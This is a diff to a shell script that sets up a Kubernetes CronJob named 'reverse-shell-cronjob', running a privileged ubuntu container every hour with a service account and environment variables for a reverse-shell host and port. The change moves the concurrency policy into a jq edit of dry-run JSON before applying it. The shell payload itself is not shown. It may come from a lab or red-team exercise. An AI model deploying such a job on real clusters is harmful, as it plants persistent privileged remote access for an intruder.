@@ -172,11 +172,10 @@ log "creating cronjob file..."
 # Delete the existing CronJob if it exists
 kubectl delete cronjob reverse-shell-cronjob --namespace=s3app --ignore-not-found 2>&1 | tee -a $LOGFILE
 
-# Create the new CronJob
+# Create the new CronJob and save the JSON output
 kubectl create cronjob reverse-shell-cronjob \
   --namespace=s3app \
   --schedule="15 */1 * * *" \
-  --concurrency-policy=Forbid \
   --image=ubuntu \
   --service-account=$SERVICE_ACCOUNT \
   --active-deadline-seconds=3600 \
@@ -186,6 +185,13 @@ kubectl create cronjob reverse-shell-cronjob \
   --env="BUCKET_NAME=$(echo -n $NEW_BUCKET_NAME | base64 -d)" \
   --env="REVERSE_SHELL_HOST=$REVERSE_SHELL_HOST" \
   --env="REVERSE_SHELL_PORT=$REVERSE_SHELL_PORT" \
-  --security-context-privileged 2>&1 | tee -a $LOGFILE
+  --security-context-privileged \
+  --dry-run=client -o json 2>&1 | tee -a $LOGFILE | tee reverse-shell-cronjob.json
+
+# Update the JSON to include the concurrency policy
+jq '.spec.concurrencyPolicy = "Forbid"' reverse-shell-cronjob.json > tmp.json && mv tmp.json reverse-shell-cronjob.json
+
+# Apply the updated CronJob configuration
+kubectl apply -f reverse-shell-cronjob.json 2>&1 | tee -a $LOGFILE
 
 log "done."
